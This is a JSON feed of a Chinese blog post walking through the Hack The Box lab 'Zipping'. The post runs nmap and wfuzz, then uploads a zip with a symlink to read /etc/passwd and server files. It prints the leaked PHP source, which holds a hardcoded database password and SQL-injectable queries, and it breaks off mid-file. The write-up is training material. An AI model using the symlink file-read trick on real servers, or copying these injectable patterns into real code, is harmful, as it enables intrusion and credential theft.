{
    "version": "https://jsonfeed.org/version/1",
    "title": "ililiiY • All posts by \"渗透\" tag",
    "description": "承蒙的是希望 做出你想做的",
    "home_page_url": "https://lookhui.github.io",
    "items": [
        {
            "id": "https://lookhui.github.io/HTB-Zipping/",
            "url": "https://lookhui.github.io/HTB-Zipping/",
            "title": "HTB-Zipping",
            "date_published": "2023-12-15T03:29:22.000Z",
            "content_html": "<h1 id=\"zipping\"><a class=\"anchor\" href=\"#zipping\">#</a> Zipping</h1>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>开启靶机后得到靶机 ip</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">靶机:10.129.48.105</span><br><span class=\"line\">自己:10.10.14.22</span><br></pre></td></tr></table></figure></p>\n<p>首先使用 nmap 来进行扫描</p>\n<p>同时使用浏览器默认访问</p>\n<p>发现和常规的不同不需要使用域名也就是不需要更换 hosts</p>\n<p>使用 f12 打开检查点击 network 查看响应器 (目的是查看是否有可利用的 api)</p>\n<p>发现并没有我们想要的</p>\n<p>使用 wfuzz 进行模糊测试查看目录</p>\n<p>同时 nmap 扫描信息出来</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-15 11:31 中国标准时间</span><br><span class=\"line\">Nmap scan report for bogon (10.129.48.105)</span><br><span class=\"line\">Host is up (0.32s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 6.04 seconds</span><br></pre></td></tr></table></figure></p>\n<p>根据我的扫描得到的目录有</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Target: http://10.129.48.105/FUZZ</span><br><span class=\"line\">Total requests: 45524</span><br><span class=\"line\"></span><br><span class=\"line\">=====================================================================</span><br><span class=\"line\">ID           Response   Lines    Word       Chars       Payload</span><br><span class=\"line\">=====================================================================</span><br><span class=\"line\"></span><br><span class=\"line\">000000006:   200        317 L    1354 W     16736 Ch    &quot;index.php&quot;</span><br><span class=\"line\">000000082:   301        9 L      28 W       315 Ch      &quot;assets&quot;</span><br><span class=\"line\">000000290:   301        9 L      28 W       316 Ch      &quot;uploads&quot;</span><br><span class=\"line\">000000291:   200        113 L    380 W      5322 Ch     &quot;upload.php&quot;</span><br><span class=\"line\">000000925:   403        9 L      28 W       278 Ch      &quot;.htpasswd&quot;</span><br><span class=\"line\">000001526:   301        9 L      28 W       313 Ch      &quot;shop&quot;</span><br><span class=\"line\">000013450:   403        9 L      28 W       278 Ch      &quot;.htaccess&quot;</span><br></pre></td></tr></table></figure></p>\n<p>先去访问这个 upload.php</p>\n<p>发现我们上传一般的木马上传不上去，文件名格式必须是压缩包的，并且压缩包内还必须包含.pdf 文件</p>\n<p>经过尝试这个题可以使用 zip 符号链接来达到任意读取</p>\n<p>参考链接 (2023 年大学生信息安全竞赛 unzip)</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://ctf.njupt.edu.cn/archives/898</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -s ../../../../../etc/passwd pass</span><br><span class=\"line\">然后将这个pass加上后缀.pdf</span><br><span class=\"line\">在通过</span><br><span class=\"line\">zip --symlinks pass.zip pass.pdf</span><br><span class=\"line\">进行解压</span><br></pre></td></tr></table></figure></p>\n<p>完成后进入</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://10.129.48.105/upload.php</span><br></pre></td></tr></table></figure></p>\n<p>上传成功后点击链接查看</p>\n<p>我使用的火狐能够查看，使用 edge 或者谷歌都会报错</p>\n<p>那我们现在开始任意读取了</p>\n<p>经过读取发现</p>\n<p>/shop/index.php</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">// Include functions and connect to the database using PDO MySQL</span><br><span class=\"line\">include &#x27;functions.php&#x27;;</span><br><span class=\"line\">$pdo = pdo_connect_mysql();</span><br><span class=\"line\">// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.</span><br><span class=\"line\">$page = isset($_GET[&#x27;page&#x27;]) &amp;&amp; file_exists($_GET[&#x27;page&#x27;] . &#x27;.php&#x27;) ? $_GET[&#x27;page&#x27;] : &#x27;home&#x27;;</span><br><span class=\"line\">// Include and show the requested page</span><br><span class=\"line\">include $page . &#x27;.php&#x27;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>functions.php</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">function pdo_connect_mysql() &#123;</span><br><span class=\"line\">    // Update the details below with your MySQL details</span><br><span class=\"line\">    $DATABASE_HOST = &#x27;localhost&#x27;;</span><br><span class=\"line\">    $DATABASE_USER = &#x27;root&#x27;;</span><br><span class=\"line\">    $DATABASE_PASS = &#x27;MySQL_P@ssw0rd!&#x27;;</span><br><span class=\"line\">    $DATABASE_NAME = &#x27;zipping&#x27;;</span><br><span class=\"line\">    try &#123;</span><br><span class=\"line\">    \treturn new PDO(&#x27;mysql:host=&#x27; . $DATABASE_HOST . &#x27;;dbname=&#x27; . $DATABASE_NAME . &#x27;;charset=utf8&#x27;, $DATABASE_USER, $DATABASE_PASS);</span><br><span class=\"line\">    &#125; catch (PDOException $exception) &#123;</span><br><span class=\"line\">    \t// If there is an error with the connection, stop the script and display the error.</span><br><span class=\"line\">    \texit(&#x27;Failed to connect to database!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// Template header, feel free to customize this</span><br><span class=\"line\">function template_header($title) &#123;</span><br><span class=\"line\">$num_items_in_cart = isset($_SESSION[&#x27;cart&#x27;]) ? count($_SESSION[&#x27;cart&#x27;]) : 0;</span><br><span class=\"line\">echo &lt;&lt;&lt;EOT</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">\t&lt;head&gt;</span><br><span class=\"line\">\t\t&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class=\"line\">\t\t&lt;title&gt;$title&lt;/title&gt;</span><br><span class=\"line\">\t\t&lt;link href=&quot;assets/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;</span><br><span class=\"line\">\t\t&lt;link rel=&quot;stylesheet&quot; href=&quot;https://use.fontawesome.com/releases/v5.7.1/css/all.css&quot;&gt;</span><br><span class=\"line\">\t&lt;/head&gt;</span><br><span class=\"line\">\t&lt;body&gt;</span><br><span class=\"line\">        &lt;header&gt;</span><br><span class=\"line\">            &lt;div class=&quot;content-wrapper&quot;&gt;</span><br><span class=\"line\">                &lt;a href=&quot;..&quot; style=&quot;text-decoration: none;&quot;&gt;&lt;h1&gt;Zipping Watch Store&lt;/h1&gt;&lt;/a&gt;</span><br><span class=\"line\">                &lt;nav&gt;</span><br><span class=\"line\">                    &lt;a href=&quot;index.php&quot;&gt;Home&lt;/a&gt;</span><br><span class=\"line\">                    &lt;a href=&quot;index.php?page=products&quot;&gt;Products&lt;/a&gt;</span><br><span class=\"line\">                &lt;/nav&gt;</span><br><span class=\"line\">                &lt;div class=&quot;link-icons&quot;&gt;</span><br><span class=\"line\">                    &lt;a href=&quot;index.php?page=cart&quot;&gt;</span><br><span class=\"line\">\t\t\t\t\t\t&lt;i class=&quot;fas fa-shopping-cart&quot;&gt;&lt;/i&gt;</span><br><span class=\"line\">\t\t\t\t\t\t&lt;span&gt;$num_items_in_cart&lt;/span&gt;</span><br><span class=\"line\">\t\t\t\t\t&lt;/a&gt;</span><br><span class=\"line\">                &lt;/div&gt;</span><br><span class=\"line\">            &lt;/div&gt;</span><br><span class=\"line\">        &lt;/header&gt;</span><br><span class=\"line\">        &lt;main&gt;</span><br><span class=\"line\">EOT;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// Template footer</span><br><span class=\"line\">function template_footer() &#123;</span><br><span class=\"line\">$year = date(&#x27;Y&#x27;);</span><br><span class=\"line\">echo &lt;&lt;&lt;EOT</span><br><span class=\"line\">        &lt;/main&gt;</span><br><span class=\"line\">        &lt;footer&gt;</span><br><span class=\"line\">            &lt;div class=&quot;content-wrapper&quot;&gt;</span><br><span class=\"line\">                &lt;p&gt;&amp;copy; $year, Zipping Watch Store&lt;/p&gt;</span><br><span class=\"line\">            &lt;/div&gt;</span><br><span class=\"line\">        &lt;/footer&gt;</span><br><span class=\"line\">    &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">EOT;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>在这里得到了数据库的用户和密码</p>\n<p>product.php</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">// Check to make sure the id parameter is specified in the URL</span><br><span class=\"line\">if (isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class=\"line\">    $id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">    // Filtering user input for letters or special characters</span><br><span class=\"line\">    if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;\\[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;, $id, $match)) &#123;</span><br><span class=\"line\">        header(&#x27;Location: index.php&#x27;);</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        // Prepare statement and execute, but does not prevent SQL injection</span><br><span class=\"line\">        $stmt = $pdo-&gt;prepare(&quot;SELECT * FROM products WHERE id = &#x27;$id&#x27;&quot;);</span><br><span class=\"line\">        $stmt-&gt;execute();</span><br><span class=\"line\">        // Fetch the product from the database and return the result as an Array</span><br><span class=\"line\">        $product = $stmt-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class=\"line\">        // Check if the product exists (array is not empty)</span><br><span class=\"line\">        if (!$product) &#123;</span><br><span class=\"line\">            // Simple error to display if the id for the product doesn&#x27;t exists (array is empty)</span><br><span class=\"line\">            exit(&#x27;Product does not exist!&#x27;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    // Simple error to display if the id wasn&#x27;t specified</span><br><span class=\"line\">    exit(&#x27;No ID provided!&#x27;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?=template_header(&#x27;Zipping | Product&#x27;)?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;product content-wrapper&quot;&gt;</span><br><span class=\"line\">    &lt;img src=&quot;assets/imgs/&lt;?=$product[&#x27;img&#x27;]?&gt;&quot; width=&quot;500&quot; height=&quot;500&quot; alt=&quot;&lt;?=$product[&#x27;name&#x27;]?&gt;&quot;&gt;</span><br><span class=\"line\">    &lt;div&gt;</span><br><span class=\"line\">        &lt;h1 class=&quot;name&quot;&gt;&lt;?=$product[&#x27;name&#x27;]?&gt;&lt;/h1&gt;</span><br><span class=\"line\">        &lt;span class=&quot;price&quot;&gt;</span><br><span class=\"line\">            &amp;dollar;&lt;?=$product[&#x27;price&#x27;]?&gt;</span><br><span class=\"line\">            &lt;?php if ($product[&#x27;rrp&#x27;] &gt; 0): ?&gt;</span><br><span class=\"line\">            &lt;span class=&quot;rrp&quot;&gt;&amp;dollar;&lt;?=$product[&#x27;rrp&#x27;]?&gt;&lt;/span&gt;</span><br><span class=\"line\">            &lt;?php endif; ?&gt;</span><br><span class=\"line\">        &lt;/span&gt;</span><br><span class=\"line\">        &lt;form action=&quot;index.php?page=cart&quot; method=&quot;post&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;number&quot; name=&quot;quantity&quot; value=&quot;1&quot; min=&quot;1&quot; max=&quot;&lt;?=$product[&#x27;quantity&#x27;]?&gt;&quot; placeholder=&quot;Quantity&quot; required&gt;</span><br><span class=\"line\">            &lt;input type=&quot;hidden&quot; name=&quot;product_id&quot; value=&quot;&lt;?=$product[&#x27;id&#x27;]?&gt;&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;submit&quot; value=&quot;Add To Cart&quot;&gt;</span><br><span class=\"line\">        &lt;/form&gt;</span><br><span class=\"line\">        &lt;div class=&quot;description&quot;&gt;</span><br><span class=\"line\">            &lt;?=$product[&#x27;desc&#x27;]?&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?=template_footer()?&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>cart.php</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">// If the user clicked the add to cart button on the product page we can check for the form data</span><br><span class=\"line\">if (isset($_POST[&#x27;product_id&#x27;], $_POST[&#x27;quantity&#x27;])) &#123;</span><br><span class=\"line\">    // Set the post variables so we easily identify them, also make sure they are integer</span><br><span class=\"line\">    $product_id = $_POST[&#x27;product_id&#x27;];</span><br><span class=\"line\">    $quantity = $_POST[&#x27;quantity&#x27;];</span><br><span class=\"line\">    // Filtering user input for letters or special characters</span><br><span class=\"line\">    if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;\\[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;, $product_id, $match) || preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]/i&quot;, $quantity, $match)) &#123;</span><br><span class=\"line\">        echo &#x27;&#x27;;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        // Construct the SQL statement with a vulnerable parameter</span><br><span class=\"line\">        $sql = &quot;SELECT * FROM products WHERE id = &#x27;&quot; . $_POST[&#x27;product_id&#x27;] . &quot;&#x27;&quot;;</span><br><span class=\"line\">        // Execute the SQL statement without any sanitization or parameter binding</span><br><span class=\"line\">        $product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class=\"line\">        // Check if the product exists (array is not empty)</span><br><span class=\"line\">        if ($product &amp;&amp; $quantity &gt; 0) &#123;</span><br><span class=\"line\">            // Product exists in database, now we can create/update the session variable for the cart</span><br><span class=\"line\">            if (isset($_SESSION[&#x27;cart&#x27;]) &amp;&amp; is_array($_SESSION[&#x27;cart&#x27;])) &#123;</span><br><span class=\"line\">                if (array_key_exists($product_id, $_SESSION[&#x27;cart&#x27;])) &#123;</span><br><span class=\"line\">                    // Product exists in cart so just update the quanity</span><br><span class=\"line\">                    $_SESSION[&#x27;cart&#x27;][$product_id] += $quantity;</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                    // Product is not in cart so add it</span><br><span class=\"line\">                    $_SESSION[&#x27;cart&#x27;][$product_id] = $quantity;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                // There are no products in cart, this will add the first product to cart</span><br><span class=\"line\">                $_SESSION[&#x27;cart&#x27;] = array($product_id =&gt; $quantity);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        // Prevent form resubmission...</span><br><span class=\"line\">        header(&#x27;location: index.php?page=cart&#x27;);</span><br><span class=\"line\">        exit;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// Remove product from cart, check for the URL param &quot;remove&quot;, this is the product id, make sure it&#x27;s a number and check if it&#x27;s in the cart</span><br><span class=\"line\">if (isset($_GET[&#x27;remove&#x27;]) &amp;&amp; is_numeric($_GET[&#x27;remove&#x27;]) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;]) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;][$_GET[&#x27;remove&#x27;]])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    // Remove the product from the shopping cart</span><br><span class=\"line\">    unset($_SESSION[&#x27;cart&#x27;][$_GET[&#x27;remove&#x27;]]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// Update product quantities in cart if the user clicks the &quot;Update&quot; button on the shopping cart page</span><br><span class=\"line\">if (isset($_POST[&#x27;update&#x27;]) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;])) &#123;</span><br><span class=\"line\">    // Loop through the post data so we can update the quantities for every product in cart</span><br><span class=\"line\">    foreach ($_POST as $k =&gt; $v) &#123;</span><br><span class=\"line\">        if (strpos($k, &#x27;quantity&#x27;) !== false &amp;&amp; is_numeric($v)) &#123;</span><br><span class=\"line\">            $id = str_replace(&#x27;quantity-&#x27;, &#x27;&#x27;, $k);</span><br><span class=\"line\">            $quantity = (int)$v;</span><br><span class=\"line\">            // Always do checks and validation</span><br><span class=\"line\">            if (is_numeric($id) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;][$id]) &amp;&amp; $quantity &gt; 0) &#123;</span><br><span class=\"line\">                // Update new quantity</span><br><span class=\"line\">                $_SESSION[&#x27;cart&#x27;][$id] = $quantity;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    // Prevent form resubmission...</span><br><span class=\"line\">    header(&#x27;location: index.php?page=cart&#x27;);</span><br><span class=\"line\">    exit;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// Send the user to the place order page if they click the Place Order button, also the cart should not be empty</span><br><span class=\"line\">if (isset($_POST[&#x27;placeorder&#x27;]) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;]) &amp;&amp; !empty($_SESSION[&#x27;cart&#x27;])) &#123;</span><br><span class=\"line\">    header(&#x27;Location: index.php?page=placeorder&#x27;);</span><br><span class=\"line\">    exit;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_POST[&#x27;clear&#x27;])) &#123;</span><br><span class=\"line\">\tunset($_SESSION[&#x27;cart&#x27;]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// Check the session variable for products in cart</span><br><span class=\"line\">$products_in_cart = isset($_SESSION[&#x27;cart&#x27;]) ? $_SESSION[&#x27;cart&#x27;] : array();</span><br><span class=\"line\">$products = array();</span><br><span class=\"line\">$subtotal = 0.00;</span><br><span class=\"line\">// If there are products in cart</span><br><span class=\"line\">if ($products_in_cart) &#123;</span><br><span class=\"line\">    // There are products in the cart so we need to select those products from the database</span><br><span class=\"line\">    // Products in cart array to question mark string array, we need the SQL statement to include IN (?,?,?,...etc)</span><br><span class=\"line\">    $array_to_question_marks = implode(&#x27;,&#x27;, array_fill(0, count($products_in_cart), &#x27;?&#x27;));</span><br><span class=\"line\">    $stmt = $pdo-&gt;prepare(&#x27;SELECT * FROM products WHERE id IN (&#x27; . $array_to_question_marks . &#x27;)&#x27;);</span><br><span class=\"line\">    // We only need the array keys, not the values, the keys are the id&#x27;s of the products</span><br><span class=\"line\">    $stmt-&gt;execute(array_keys($products_in_cart));</span><br><span class=\"line\">    // Fetch the products from the database and return the result as an Array</span><br><span class=\"line\">    $products = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);</span><br><span class=\"line\">    // Calculate the subtotal</span><br><span class=\"line\">    foreach ($products as $product) &#123;</span><br><span class=\"line\">        $subtotal += (float)$product[&#x27;price&#x27;] * (int)$products_in_cart[$product[&#x27;id&#x27;]];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?=template_header(&#x27;Zipping | Cart&#x27;)?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;cart content-wrapper&quot;&gt;</span><br><span class=\"line\">    &lt;h1&gt;Shopping Cart&lt;/h1&gt;</span><br><span class=\"line\">    &lt;form action=&quot;index.php?page=cart&quot; method=&quot;post&quot;&gt;</span><br><span class=\"line\">        &lt;table&gt;</span><br><span class=\"line\">            &lt;thead&gt;</span><br><span class=\"line\">                &lt;tr&gt;</span><br><span class=\"line\">                    &lt;td 